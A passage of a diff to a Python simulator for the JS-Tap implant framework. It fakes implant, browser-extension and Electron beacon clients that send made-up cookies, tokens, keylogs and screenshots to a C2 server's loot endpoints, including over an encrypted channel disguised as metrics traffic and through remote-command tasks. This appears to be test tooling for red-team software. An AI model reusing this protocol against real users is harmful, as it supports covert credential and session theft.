+            {"id": 1, "url": "app://obsidian.md/vault/notes/daily/2026-02-15.md", "title": "Obsidian - Daily Note", "injected": True},
+            {"id": 2, "url": "app://obsidian.md/plugins/community", "title": "Obsidian - Community Plugins", "injected": False},
+            {"id": 3, "url": "app://obsidian.md/vault/templates/meeting-notes.md", "title": "Obsidian - Templates", "injected": True},
+        ],
+    },
+}
+
+# ── Screenshot data ────────────────────────────────────────────────────────────
+
+SCREENSHOT_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "clientSimulatorScreenshot.png")
 
 
-			# Need a pattern of behavior here
-			# URL change
-			# Storage/cookie change
-			# Screenshot
-			# HTML Scrape
-			# User Inputs
-			# API Calls
+# ── SimClient ──────────────────────────────────────────────────────────────────
+
+class SimClient:
+    def __init__(self, index, label, tag, user_agent, server):
+        self.index = index
+        self.label = label
+        self.tag = tag
+        self.user_agent = user_agent
+        self.server = server.rstrip("/")
+        self.uuid = None
+        self.payloads_received = []  # list of label strings
+        self.client_type = "app"
+
+    @property
+    def uuid_short(self):
+        if not self.uuid:
+            return "--------"
+        return f"{self.uuid[:4]}..{self.uuid[-4:]}"
+
+    async def register(self, session):
+        tag_path = f"/{self.tag}" if self.tag else ""
+        url = f"{self.server}/client/getToken{tag_path}"
+        headers = {"User-Agent": self.user_agent}
+        try:
+            async with session.get(url, headers=headers, ssl=False) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    self.uuid = data["clientToken"]
+                else:
+                    print(f"  [!] Client {self.index} registration failed: HTTP {resp.status}")
+        except Exception as e:
+            print(f"  [!] Client {self.index} registration error: {e}")
+
+    async def send_loot_round(self, session):
+        if not self.uuid:
+            return
+
+        headers = {"User-Agent": self.user_agent}
+        base = self.server
+
+        # URL
+        url = random.choice(FAKE_URLS)
+        await self._post_json(session, f"{base}/loot/location/{self.uuid}",
+                              {"url": url}, headers)
+
+        # Cookies (1-2)
+        for name, value in random.sample(FAKE_COOKIES, random.randint(1, 2)):
+            await self._post_json(session, f"{base}/loot/dessert/{self.uuid}",
+                                  {"cookieName": name, "cookieValue": value}, headers)
+
+        # localStorage
+        key, value = random.choice(FAKE_LOCAL_STORAGE)
+        await self._post_json(session, f"{base}/loot/localstore/{self.uuid}",
+                              {"key": key, "value": value}, headers)
+
+        # sessionStorage
+        key, value = random.choice(FAKE_SESSION_STORAGE)
+        await self._post_json(session, f"{base}/loot/sessionstore/{self.uuid}",
+                              {"key": key, "value": value}, headers)
+
+        # User inputs (1-2)
+        for name, value in random.sample(FAKE_INPUTS, random.randint(1, 2)):
+            await self._post_json(session, f"{base}/loot/input/{self.uuid}",
+                                  {"inputName": name, "inputValue": value}, headers)
+
+        # HTML
+        html_snippet = random.choice(FAKE_HTML_SNIPPETS)
+        await self._post_json(session, f"{base}/loot/html/{self.uuid}",
+                              {"url": url, "html": html_snippet}, headers)
+
+        # Screenshot
+        await self._post_screenshot(session, f"{base}/loot/screenshot/{self.uuid}", headers)
+
+        # XHR call
+        xhr = random.choice(FAKE_XHR_CALLS)
+        await self._post_json(session, f"{base}/loot/xhrRequest/{self.uuid}", xhr, headers)
+
+    async def poll_tasks(self, session):
+        """Poll for payloads. Returns list of payload label strings."""
+        if not self.uuid:
+            return []
+
+        headers = {"User-Agent": self.user_agent}
+        url = f"{self.server}/client/taskCheck/{self.uuid}"
+        new_payloads = []
+
+        try:
+            async with session.get(url, headers=headers, ssl=False) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    # Response: [{"id": N, "data": "base64-js-code"}, ...]
+                    if isinstance(data, list):
+                        for task in data:
+                            code_b64 = task.get("data", "")
+                            try:
+                                code_text = base64.b64decode(code_b64).decode("utf-8", errors="replace")
+                            except Exception:
+                                code_text = code_b64
+                            # Extract a label from the code (first ~50 meaningful chars)
+                            label = self._extract_label(code_text)
+                            new_payloads.append(label)
+                            self.payloads_received.append(label)
+                            # Send ACK
+                            await self._ack_payload(session, code_text)
+        except Exception:
+            pass
+
+        return new_payloads
+
+    async def _ack_payload(self, session, payload_code):
+        """ACK a received payload via customData endpoint."""
+        snippet = payload_code[:80].replace("\n", " ")
+        note_b64 = base64.b64encode(b"SimAck").decode()
+        data_b64 = base64.b64encode(f"Received: {snippet}".encode()).decode()
+        headers = {"User-Agent": self.user_agent}
+        await self._post_json(session, f"{self.server}/loot/customData/{self.uuid}",
+                              {"note": note_b64, "data": data_b64}, headers)
+
+    @staticmethod
+    def _extract_label(code_text):
+        """Extract a short label from JS payload code."""
+        # Try to find a comment like // name: ... or /* name */
+        for line in code_text.split("\n")[:5]:
+            stripped = line.strip()
+            if stripped.startswith("//"):
+                label = stripped.lstrip("/ ").strip()
+                if label:
+                    return label[:50]
+        # Fall back to first non-empty line
+        for line in code_text.split("\n"):
+            stripped = line.strip()
+            if stripped:
+                return stripped[:50]
+        return "(empty payload)"
+
+    @staticmethod
+    async def _post_json(session, url, payload, headers):
+        try:
+            async with session.post(url, json=payload, headers=headers, ssl=False) as resp:
+                pass
+        except Exception:
+            pass
+
+    async def _post_screenshot(self, session, url, headers):
+        try:
+            with open(SCREENSHOT_PATH, "rb") as f:
+                img_data = f.read()
+            hdrs = {**headers, "Content-Type": "image/png"}
+            async with session.post(url, data=img_data, headers=hdrs, ssl=False) as resp:
+                pass
+        except Exception:
+            pass
 
 
-			await self.urlEvent(session)
-			await self.cookieEvent(session)
-			time.sleep(0.1)
+# ── SimBeaconClient ───────────────────────────────────────────────────────────
 
-			await self.localStorageEvent(session)
-			time.sleep(0.05)
+class SimBeaconClient:
+    """Simulates a bex-beacon browser extension client with encrypted comms."""
 
-			await self.sessionStorageEvent(session)
-			time.sleep(0.2)
+    def __init__(self, index, label, tag, user_agent, server):
+        self.index = index
+        self.label = label
+        self.tag = tag
+        self.user_agent = user_agent
+        self.server = server.rstrip("/")
+        self.uuid = None
+        self.send_key = None     # AES key for encrypting outgoing messages
+        self.receive_key = None  # AES key for decrypting incoming responses
+        self.sidecar_commands = []  # list of label strings for received commands
+        self.client_type = "bex"
 
-			await self.screenshotEvent(session)
-			await self.htmlEvent(session)
-			time.sleep(0.3)
-			
-			await self.userInputEvent(session)
-			await self.xhrOpenEvent(session)
-			await self.xhrSetHeaderEvent(session)
-			await self.xhrCallEvent(session)
-			time.sleep(0.1)
-			
-			await self.fetchSetupEvent(session)
-			await self.fetchHeaderEvent(session)
-			await self.fetchCallEvent(session)
+    @property
+    def uuid_short(self):
+        if not self.uuid:
+            return "--------"
+        return f"{self.uuid[:4]}..{self.uuid[-4:]}"
 
-			sleepAmount = random.randint(randStartRange, randEndRange)
-			print("Client " + str(self.client_id) + " waiting: " + str(sleepAmount))
-			time.sleep(sleepAmount)
+    @property
+    def payloads_received(self):
+        """Alias so StatusGrid can treat both client types uniformly."""
+        return self.sidecar_commands
+
+    async def register(self, session):
+        tag_path = f"/{self.tag}" if self.tag else ""
+        url = f"{self.server}/client/getToken{tag_path}/bex-beacon"
+        headers = {"User-Agent": self.user_agent}
+        try:
+            async with session.get(url, headers=headers, ssl=False) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    self.uuid = data["clientToken"]
+                else:
+                    print(f"  [!] Beacon {self.index} registration failed: HTTP {resp.status}")
+        except Exception as e:
+            print(f"  [!] Beacon {self.index} registration error: {e}")
+
+    async def key_exchange(self, session):
+        if not self.uuid:
+            return
+
+        # Generate RSA-OAEP 2048-bit keypair
+        private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+        public_key = private_key.public_key()
+
+        # Export public key as DER/SPKI, base64-encode
+        pub_der = public_key.public_bytes(
+            encoding=serialization.Encoding.DER,
+            format=serialization.PublicFormat.SubjectPublicKeyInfo,
+        )
+        pub_b64 = base64.b64encode(pub_der).decode("utf-8")
+
+        headers = {"User-Agent": self.user_agent}
+        url = f"{self.server}/client/keyExchange/{self.uuid}"
+
+        try:
+            async with session.post(url, json={"publicKey": pub_b64}, headers=headers, ssl=False) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if data.get("enable") == "true":
+                        encrypted_keys_b64 = data["encryptedKeys"]
+                        encrypted_keys = base64.b64decode(encrypted_keys_b64)
+                        # Decrypt with RSA-OAEP SHA-256
+                        plaintext = private_key.decrypt(
+                            encrypted_keys,
+                            asym_padding.OAEP(
+                                mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
+                                algorithm=hashes.SHA256(),
+                                label=None,
+                            ),
+                        )
+                        # First 32 bytes = client's send key (server's receiveKey)
+                        # Next 32 bytes = client's receive key (server's sendKey)
+                        self.send_key = plaintext[:32]
+                        self.receive_key = plaintext[32:64]
+                    else:
+                        print(f"  [!] Beacon {self.index} encryption not enabled by server")
+                else:
+                    print(f"  [!] Beacon {self.index} key exchange failed: HTTP {resp.status}")
+        except Exception as e:
+            print(f"  [!] Beacon {self.index} key exchange error: {e}")
+
+    async def _send_encrypted(self, session, path, message_dict):
+        """Encrypt and send a message through the metrics endpoint."""
+        if not self.uuid or not self.send_key:
+            return None
+
+        iv = os.urandom(12)
+        aesgcm = AESGCM(self.send_key)
+
+        path_ct = aesgcm.encrypt(iv, path.encode("utf-8"), None)
+        msg_ct = aesgcm.encrypt(iv, json.dumps(message_dict).encode("utf-8"), None)
+
+        iv_b64 = base64.b64encode(iv).decode("utf-8")
+        path_b64 = base64.b64encode(path_ct).decode("utf-8")
+        msg_b64 = base64.b64encode(msg_ct).decode("utf-8")
+
+        payload = {"metricData": f"{iv_b64},{path_b64},{msg_b64}"}
+        headers = {"User-Agent": self.user_agent}
+        url = f"{self.server}/client/metrics/{self.uuid}"
+
+        try:
+            async with session.post(url, json=payload, headers=headers, ssl=False) as resp:
+                if resp.status == 200:
+                    ct = resp.content_type or ""
+                    if "json" in ct:
+                        return await resp.json()
+                return None
+        except Exception:
+            return None
+
+    async def send_loot_round(self, session):
+        if not self.uuid or not self.send_key:
+            return
+
+        # Pick 1-3 random domains
+        domains = random.sample(FAKE_BEACON_DOMAINS, random.randint(1, 3))
+
+        for domain in domains:
+            # Build full URL
+            paths = FAKE_BEACON_PATHS.get(domain, ["/"])
+            path = random.choice(paths)
+            full_url = f"https://{domain}{path}"
+
+            # Send visit report
+            await self._send_encrypted(session, "/bex/report", {
+                "visits": [{"domain": domain, "url": full_url}],
+            })
+
+            # Send 1-2 cookie captures
+            for name, value, metadata in random.sample(FAKE_BEACON_COOKIES, random.randint(1, 2)):
+                await self._send_encrypted(session, "/bex/capture", {
+                    "domain": domain,
+                    "type": "cookie",
+                    "name": name,
+                    "value": value,
+                    "url": full_url,
+                    "metadata": metadata,
+                })
+
+            # Send 1 localStorage capture
+            key, value = random.choice(FAKE_BEACON_LOCAL_STORAGE)
+            await self._send_encrypted(session, "/bex/capture", {
+                "domain": domain,
+                "type": "local_storage",
+                "name": key,
+                "value": value,
+                "url": full_url,
+            })
+
+            # Send 1 sessionStorage capture
+            key, value = random.choice(FAKE_BEACON_SESSION_STORAGE)
+            await self._send_encrypted(session, "/bex/capture", {
+                "domain": domain,
+                "type": "session_storage",
+                "name": key,
+                "value": value,
+                "url": full_url,
+            })
+
+            # Send 1 header capture
+            hdr_name, hdr_value = random.choice(FAKE_BEACON_HEADERS)
+            await self._send_encrypted(session, "/bex/capture", {
+                "domain": domain,
+                "type": "header",
+                "name": hdr_name,
+                "value": hdr_value,
+                "url": full_url,
+            })
+
+        # Report sidecar available
+        await self._send_encrypted(session, "/bex/sidecar/status", {"supported": True, "connected": True})
+
+    async def poll_tasks(self, session):
+        """Poll for tasks via encrypted channel. Returns list of label strings."""
+        if not self.uuid or not self.send_key:
+            return []
+
+        resp_data = await self._send_encrypted(session, "/client/taskCheck", {})
+        if not resp_data:
+            return []
+
+        new_labels = []
+
+        # Response is {"metricData": "base64(iv),base64(ciphertext)"}
+        metric_data = resp_data.get("metricData")
+        if not metric_data:
+            return []
+
+        parts = metric_data.split(",")
+        if len(parts) != 2:
+            return []
+
+        try:
+            iv = base64.b64decode(parts[0])
+            ciphertext = base64.b64decode(parts[1])
+            aesgcm = AESGCM(self.receive_key)
+            plaintext = aesgcm.decrypt(iv, ciphertext, None)
+            tasks = json.loads(plaintext.decode("utf-8"))
+        except Exception:
+            return []
+
+        if not isinstance(tasks, list):
+            return []
+
+        for task in tasks:
+            code_b64 = task.get("data", "")
+            try:
+                code_bytes = base64.b64decode(code_b64)
+                code_text = code_bytes.decode("utf-8", errors="replace")
+            except Exception:
+                code_text = code_b64
+
+            # Try to parse as JSON to detect sidecar commands
+            try:
+                task_json = json.loads(code_text)
+                if task_json.get("type") == "SIDECAR_COMMAND":
+                    label = self._handle_sidecar_command(session, task_json)
+                    new_labels.append(label)
+                    self.sidecar_commands.append(label)
+                    # Send sidecar result asynchronously
+                    await self._send_sidecar_result(session, task_json)
+                    continue
+            except (json.JSONDecodeError, TypeError):
+                pass
+
+            # Not a sidecar command — treat as custom payload, ACK it
+            label = SimClient._extract_label(code_text)
+            new_labels.append(label)
+            self.sidecar_commands.append(label)
+            await self._ack_payload(session, code_text)
+
+        return new_labels
+
+    def _handle_sidecar_command(self, session, task_json):
+        """Extract a display label from a sidecar command task."""
+        cmd = task_json.get("command", "unknown")
+        args = task_json.get("args", {})
+        if cmd == "list_dir":
+            return f"list_dir {args.get('path', '/')}"
+        elif cmd == "read_file":
+            return f"read_file {args.get('filename', '?')}"
+        elif cmd == "exec_cmd":
+            return f"exec_cmd: {args.get('code', '?')}"
+        return f"sidecar: {cmd}"
+
+    async def _send_sidecar_result(self, session, task_json):
+        """Send a fake sidecar result back to the server."""
+        cmd = task_json.get("command", "unknown")
+        request_id = task_json.get("requestId", "")
+        fake_data = FAKE_SIDECAR_RESPONSES.get(cmd, {"output": "command completed"})
+        await self._send_encrypted(session, "/bex/sidecar/result", {
+            "requestId": request_id,
+            "command": cmd,
+            "success": True,
+            "data": fake_data,
+            "error": "",
+        })
+
+    async def _ack_payload(self, session, payload_code):
+        """ACK a received payload via encrypted customData endpoint."""
+        snippet = payload_code[:80].replace("\n", " ")
+        note_b64 = base64.b64encode(b"SimAck").decode()
+        data_b64 = base64.b64encode(f"Received: {snippet}".encode()).decode()
+        await self._send_encrypted(session, "/loot/customData", {
+            "note": note_b64,
+            "data": data_b64,
+        })
 
 
-	async def getUUID(self, session):
-		print("Retrieving UUID")
-		async with session.get(f'{apiServer}/client/getToken', ssl=False) as response:
-			if response.status == 200:
-				data = await response.json()
-				self.uuid = data["clientToken"]
-			else:
-				print("Failed to receive UUID")
+# ── SimElectronClient ─────────────────────────────────────────────────────────
+
+class SimElectronClient(SimBeaconClient):
+    """Simulates an atom-beacon Electron client with encrypted comms."""
+
+    def __init__(self, index, label, tag, user_agent, server):
+        super().__init__(index, label, tag, user_agent, server)
+        self.client_type = "electron"
+
+    async def register(self, session):
+        tag_path = f"/{self.tag}" if self.tag else ""
+        url = f"{self.server}/client/getToken{tag_path}/atom-beacon"
+        headers = {"User-Agent": self.user_agent}
+        try:
+            async with session.get(url, headers=headers, ssl=False) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    self.uuid = data["clientToken"]
+                else:
+                    print(f"  [!] Electron {self.index} registration failed: HTTP {resp.status}")
+        except Exception as e:
+            print(f"  [!] Electron {self.index} registration error: {e}")
+
+    async def _report_status(self, session):
+        """Send atom-beacon status with capabilities and window list."""
+        profile = ELECTRON_STATUS_PROFILES.get(self.label, {})
+        await self._send_encrypted(session, "/beacon/status", {
+            "supported": True,
+            "hostname": profile.get("hostname", "unknown"),
+            "platform": profile.get("platform", "linux"),
+            "arch": profile.get("arch", "x64"),
+            "username": profile.get("username", "user"),
+            "homedir": profile.get("homedir", "/home/user"),
+            "capabilities": profile.get("capabilities", []),
+            "windows": profile.get("windows", []),
+        })
+
+    async def _send_encrypted_screenshot(self, session):
+        """Send screenshot PNG via encrypted channel."""
+        if not self.send_key:
+            return
+        try:
+            with open(SCREENSHOT_PATH, "rb") as f:
+                img_data = f.read()
+            # Screenshots go via /loot/screenshot which expects raw image bytes as the message
+            # But the encrypted channel wraps everything in JSON, so base64-encode the image
+            img_b64 = base64.b64encode(img_data).decode("utf-8")
+            await self._send_encrypted(session, "/loot/screenshot", {"image": img_b64})
+        except Exception:
+            pass
+
+    async def send_loot_round(self, session):
+        if not self.uuid or not self.send_key:
+            return
+
+        # Report full atom-beacon status
+        await self._report_status(session)
+
+        # Pick 1-3 random Electron domains
+        domains = random.sample(FAKE_ELECTRON_DOMAINS, random.randint(1, 3))
+
+        for domain in domains:
+            paths = FAKE_ELECTRON_PATHS.get(domain, ["/"])
+            path = random.choice(paths)
+            full_url = f"https://{domain}{path}"
+
+            # Visit report
+            await self._send_encrypted(session, "/bex/report", {
+                "visits": [{"domain": domain, "url": full_url}],
+            })
+
+            # Cookies (1-2)
+            for name, value, metadata in random.sample(FAKE_BEACON_COOKIES, random.randint(1, 2)):
+                await self._send_encrypted(session, "/bex/capture", {
+                    "domain": domain, "type": "cookie",
+                    "name": name, "value": value, "url": full_url, "metadata": metadata,
+                })
+
+            # localStorage
+            key, value = random.choice(FAKE_BEACON_LOCAL_STORAGE)
+            await self._send_encrypted(session, "/bex/capture", {
+                "domain": domain, "type": "local_storage",
+                "name": key, "value": value, "url": full_url,
+            })
+
+            # sessionStorage
+            key, value = random.choice(FAKE_BEACON_SESSION_STORAGE)
+            await self._send_encrypted(session, "/bex/capture", {
+                "domain": domain, "type": "session_storage",
+                "name": key, "value": value, "url": full_url,
+            })
+
+            # Request headers
+            hdr_name, hdr_value = random.choice(FAKE_BEACON_HEADERS)
+            await self._send_encrypted(session, "/bex/capture", {
+                "domain": domain, "type": "header",
+                "name": hdr_name, "value": hdr_value, "url": full_url,
+            })
+
+            # Response headers
+            rh_name, rh_value = random.choice(FAKE_RESPONSE_HEADERS)
+            await self._send_encrypted(session, "/bex/capture", {
+                "domain": domain, "type": "response_header",
+                "name": rh_name, "value": rh_value, "url": full_url,
+            })
+
+        # Keylogs (1-2 entries)
+        for keylog in random.sample(FAKE_KEYLOGS, random.randint(1, 2)):
+            await self._send_encrypted(session, "/loot/keylog", keylog)
+
+        # Screenshot via encrypted channel
+        await self._send_encrypted_screenshot(session)
+
+        # Report sidecar status (atom-beacon has built-in capabilities)
+        await self._send_encrypted(session, "/bex/sidecar/status", {"supported": True, "connected": True})
+
+    async def poll_tasks(self, session):
+        """Poll for tasks, handling atom-beacon specific task types."""
+        if not self.uuid or not self.send_key:
+            return []
+
+        resp_data = await self._send_encrypted(session, "/client/taskCheck", {})
+        if not resp_data:
+            return []
+
+        new_labels = []
+
+        metric_data = resp_data.get("metricData")
+        if not metric_data:
+            return []
+
+        parts = metric_data.split(",")
+        if len(parts) != 2:
+            return []
+
+        try:
+            iv = base64.b64decode(parts[0])
+            ciphertext = base64.b64decode(parts[1])
+            aesgcm = AESGCM(self.receive_key)
+            plaintext = aesgcm.decrypt(iv, ciphertext, None)
+            tasks = json.loads(plaintext.decode("utf-8"))
+        except Exception:
+            return []
+
+        if not isinstance(tasks, list):
+            return []
+
+        for task in tasks:
+            code_b64 = task.get("data", "")
+            try:
+                code_bytes = base64.b64decode(code_b64)
+                code_text = code_bytes.decode("utf-8", errors="replace")
+            except Exception:
+                code_text = code_b64
+
+            try:
+                task_json = json.loads(code_text)
+                task_type = task_json.get("type", "")
+
+                if task_type == "SIDECAR_COMMAND":
+                    label = self._handle_sidecar_command(session, task_json)
+                    new_labels.append(label)
+                    self.sidecar_commands.append(label)
+                    await self._send_sidecar_result(session, task_json)
+                    continue
+
+                if task_type == "SCREENSHOT":
+                    label = "screenshot"
+                    new_labels.append(label)
+                    self.sidecar_commands.append(label)
+                    await self._send_encrypted_screenshot(session)
+                    continue
+
+                if task_type == "SCREENSHOT_SETTINGS":
+                    label = "screenshot_settings"
+                    new_labels.append(label)
+                    self.sidecar_commands.append(label)
+                    # ACK — no real settings to apply in simulator
+                    continue
+
+            except (json.JSONDecodeError, TypeError):
+                pass
+
+            # Fallback: treat as custom payload
+            label = SimClient._extract_label(code_text)
+            new_labels.append(label)
+            self.sidecar_commands.append(label)
+            await self._ack_payload(session, code_text)
+
+        return new_labels
 
 
-	async def cookieEvent(self, session):
-		print("Sending cookie...")
-		await session.post(f'{apiServer}/loot/dessert/{self.uuid}', json={
-			"cookieName": "cookieMonster",
-			"cookieValue": "goYum"
-			}, ssl=False)
+# ── StatusGrid ─────────────────────────────────────────────────────────────────
+
+class StatusGrid:
+    def __init__(self, clients):
+        self.clients = clients
+        self._lines_printed = 0
+
+    def render(self, last_poll_time=None):
+        """Clear previous output and reprint the status grid."""
+        # Move cursor up to overwrite previous grid
+        if self._lines_printed > 0:
+            sys.stdout.write(f"\033[{self._lines_printed}A\033[J")
+
+        lines = []
+        bar = "\u2550" * 80
+        thin = "\u2500" * 80
+
+        total_payloads = sum(len(c.payloads_received) for c in self.clients)
+        registered = sum(1 for c in self.clients if c.uuid)
+
+        lines.append(f"\u2550{bar}")
+        lines.append(f"  JS-Tap Client Simulator{' ' * 33}{registered} clients registered")
+        lines.append(f"\u2550{bar}")
+        lines.append(f"  {'#':>2}  {'Type':<8} {'Label':<14} {'Tag':<9} {'UUID':<12} Payloads / Sidecar Cmds")
+        lines.append(f" \u2500{thin}")
+
+        for c in self.clients:
+            ctype = getattr(c, "client_type", "app")
+            payloads_str = ", ".join(c.payloads_received) if c.payloads_received else ""
+            if len(payloads_str) > 36:
+                payloads_str = payloads_str[:33] + "..."
+            lines.append(
+                f"  {c.index:>2}  {ctype:<8} {c.label:<14} {c.tag:<9} {c.uuid_short:<12} {payloads_str}"
+            )
+
+        lines.append(f" \u2500{thin}")
+        poll_str = time.strftime("%H:%M:%S", time.localtime(last_poll_time)) if last_poll_time else "--:--:--"
+        lines.append(f"  Last poll: {poll_str}  |  Total payloads delivered: {total_payloads}")
+        lines.append(f"\u2550{bar}")
+
+        output = "\n".join(lines)
+        print(output)
+        self._lines_printed = len(lines)
 
 
-	async def localStorageEvent(self, session):
-		print("Sending local storage event...")
-		await session.post(f'{apiServer}/loot/localstore/{self.uuid}', json={
-			"key": "localStorageKey",
-			"value": "localStorageSuperSecretJWTValue"
-			}, ssl=False)
+# ── Main ───────────────────────────────────────────────────────────────────────
 
+def build_clients(server, include_beacons=True, include_electrons=True):
+    """Build the list of SimClient, SimBeaconClient, and SimElectronClient instances."""
+    clients = []
+    idx = 1
+    for profile in CLIENT_PROFILES:
+        for _ in range(profile["count"]):
+            clients.append(SimClient(
+                index=idx,
+                label=profile["label"],
+                tag=profile["tag"],
+                user_agent=profile["user_agent"],
+                server=server,
+            ))
+            idx += 1
 
-	async def sessionStorageEvent(self, session):
-		print("Sending session storage event...")
-		await session.post(f'{apiServer}/loot/sessionstore/{self.uuid}', json={
-			"key": "sessionStorageKey",
-			"value": "sessionStorageSuperSecretJWTValue"
-			}, ssl=False)
+    if include_beacons:
+        for profile in BEACON_PROFILES:
+            for _ in range(profile["count"]):
+                clients.append(SimBeaconClient(
+                    index=idx,
+                    label=profile["label"],
+                    tag=profile["tag"],
+                    user_agent=profile["user_agent"],
+                    server=server,
+                ))
+                idx += 1
 
+    if include_electrons:
+        for profile in ELECTRON_PROFILES:
+            for _ in range(profile["count"]):
+                clients.append(SimElectronClient(
+                    index=idx,
+                    label=profile["label"],
+                    tag=profile["tag"],
+                    user_agent=profile["user_agent"],
+                    server=server,
+                ))
+                idx += 1
 
-	async def urlEvent(self, session):
-		print("Sending URL event...")
-
-		await session.post(f'{apiServer}/loot/location/{self.uuid}', json={
-			"url": victimApp + "/totesDashboard"
-			}, ssl=False)
-
-
-	async def htmlEvent(self, session):
-		print("Sending HTML event...")
-		await session.post(f'{apiServer}/loot/html/{self.uuid}', json={
-			"url": victimApp + "/totesDashboard",
-			"html": fakeHtml
-			}, ssl=False)
-
-	async def screenshotEvent(self, session):
-		print("Sending screenshot event...")
-
-		headers = {'Content-Type': 'image/png'}
-		async with session.post(f'{apiServer}/loot/screenshot/{self.uuid}', 
-             data=screenshotData, 
-             headers=headers, 
-             ssl=False) as response:
-			print("Sent screenshot")
-
-	async def userInputEvent(self, session):
-		print("Sending user input event...")
-		await session.post(f'{apiServer}/loot/input/{self.uuid}', json={
-			"inputName": "secretPassword",
-			"inputValue": "MyVoiceIsMyPassport"
-			}, ssl=False)
-
-	async def xhrOpenEvent(self, session):
-		print("Sending XHR Open event...")
-		await session.post(f'{apiServer}/loot/xhrOpen/{self.uuid}', json={
-			"method": "POST",
-			"url": victimApp + "/sensitiveAPI/secretShit"
-			}, ssl=False)
-
-
-
-	async def xhrSetHeaderEvent(self, session):
-		print("Sending XHR Header Event...")
-		await session.post(f'{apiServer}/loot/xhrSetHeader/{self.uuid}', json={
-			"header": "Authorization",
-			"value": "SECRET_JWT_VALUE"
-			}, ssl=False)
-
-		await session.post(f'{apiServer}/loot/xhrSetHeader/{self.uuid}', json={
-			"header": "RandomHeader",
-			"value": "SomethingOrAnother"
-			}, ssl=False)
-
-
-
-	async def xhrCallEvent(self, session):
-		print("Sending XHR call event...")
-
-		requestString  = "{'something':'something value', 'something else': 'some other value'}"
-		responseString = "{'responseSomethin201g':'something value', 'responseSomething else': 'some other value'}"
-
-		requestBody  = base64.b64encode(requestString.encode())
-		responseBody = base64.b64encode(responseString.encode())
-
-		await session.post(f'{apiServer}/loot/xhrCall/{self.uuid}', json={
-			"requestBody": requestBody.decode(),
-			"responseBody": responseBody.decode()
-			}, ssl=False)
-
-
-	async def fetchSetupEvent(self, session):
-		print("Sending Fetch Setup Event...")
-		await session.post(f'{apiServer}/loot/fetchSetup/{self.uuid}', json={
-			"method": "POST",
-			"url": victimApp + "/sensitiveAPI/fetchSecretShit"
-			}, ssl=False)
-
-
-
-
-	async def fetchHeaderEvent(self, session):
-		print("Sending Fetch Header Event...")
-		await session.post(f'{apiServer}/loot/fetchHeader/{self.uuid}', json={
-			"header": "Authorization",
-			"value":"SECRET_JWT_VALUE"
-			}, ssl=False)
-
-
-	async def fetchCallEvent(self, session):
-		print("Sending Fetch Call Event...")
-
-		requestString  = "{'something':'fetchSomething value', 'something else': 'fetch some other value'}"
-		responseString = "{'responseSomething':'something value', 'responseSomething else': 'some other value'}"
-
-		requestBody  = base64.b64encode(requestString.encode())
-		responseBody = base64.b64encode(responseString.encode())
-
-		await session.post(f'{apiServer}/loot/fetchCall/{self.uuid}', json={
-			"requestBody": requestBody.decode(),
-			"responseBody": responseBody.decode()
-			}, ssl=False)
-
+    return clients
 
 
 async def main():
+    parser = argparse.ArgumentParser(description="JS-Tap Client Simulator")
+    parser.add_argument("--server", default="https://127.0.0.1:8444",
+                        help="JS-Tap server URL (default: https://127.0.0.1:8444)")
+    parser.add_argument("--loot-rounds", type=int, default=2,
+                        help="Rounds of fake loot per client (default: 2, 0 = continuous)")
+    parser.add_argument("--poll-interval", type=float, default=3,
+                        help="Seconds between payload polls (default: 3)")
+    parser.add_argument("--no-loot", action="store_true",
+                        help="Register and poll only, skip sending fake loot")
+    parser.add_argument("--no-beacons", action="store_true",
+                        help="Skip beacon clients, only run app (js-implant) clients")
+    parser.add_argument("--no-electrons", action="store_true",
+                        help="Skip electron clients, only run app and beacon clients")
+    args = parser.parse_args()
+
+    clients = build_clients(args.server, include_beacons=not args.no_beacons,
+                            include_electrons=not args.no_electrons)
+    grid = StatusGrid(clients)
+
+    print(f"\n  Registering {len(clients)} clients with {args.server} ...\n")
+
+    # Register all clients concurrently
     async with aiohttp.ClientSession() as session:
-       clients = [Client(client_id=i) for i in range(numClients)]
-       await asyncio.gather(*(client.initialize(session) for client in clients))
-       tasks = [client.run(session) for client in clients]
-       await asyncio.gather(*tasks)
+        await asyncio.gather(*(c.register(session) for c in clients))
+
+        registered = sum(1 for c in clients if c.uuid)
+        if registered == 0:
+            print("  [!] No clients registered. Is the server running?")
+            return
+
+        print(f"  {registered}/{len(clients)} clients registered.")
+
+        # Key exchange for beacon clients
+        beacon_clients = [c for c in clients if isinstance(c, SimBeaconClient) and c.uuid]
+        if beacon_clients:
+            print(f"  Running key exchange for {len(beacon_clients)} beacon client(s)...")
+            await asyncio.gather(*(c.key_exchange(session) for c in beacon_clients))
+            keyed = sum(1 for c in beacon_clients if c.send_key)
+            print(f"  {keyed}/{len(beacon_clients)} beacon key exchanges completed.\n")
+        else:
+            print()
+
+        grid.render()
+
+        # Send loot rounds
+        if not args.no_loot:
+            rounds = args.loot_rounds
+            if rounds == 0:
+                # Continuous mode: send loot in background alongside polling
+                pass
+            else:
+                for r in range(rounds):
+                    await asyncio.gather(*(c.send_loot_round(session) for c in clients if c.uuid))
+                    # Small delay between rounds
+                    await asyncio.sleep(0.5)
+                print(f"  Sent {rounds} loot round(s). Entering poll loop (Ctrl+C to exit)...\n")
+        else:
+            print("  Skipping loot (--no-loot). Entering poll loop (Ctrl+C to exit)...\n")
+
+        # Poll loop
+        continuous_loot = not args.no_loot and args.loot_rounds == 0
+        loot_round_counter = 0
+
+        try:
+            while True:
+                # Poll all clients for tasks concurrently
+                await asyncio.gather(*(c.poll_tasks(session) for c in clients if c.uuid))
+                grid.render(last_poll_time=time.time())
+
+                # If continuous loot mode, send a round periodically
+                if continuous_loot:
+                    loot_round_counter += 1
+                    await asyncio.gather(*(c.send_loot_round(session) for c in clients if c.uuid))
+
+                await asyncio.sleep(args.poll_interval)
+        except KeyboardInterrupt:
+            # Move below the grid before exiting
+            print(f"\n  Shutting down. {sum(len(c.payloads_received) for c in clients)} total payloads received across {registered} clients.")
+
 
 if __name__ == "__main__":
-	asyncio.run(main())
-
-	# try:
-	# 	while True:
-	# 		time.sleep(5)
-	# except KeyboardInterrupt:
-	# 	for clientThread in clientThreads:
-	# 		clientThread.stop()
-
-	# 	for clientThread in clientThreads:
-	# 		clientThread.join()
+    try:
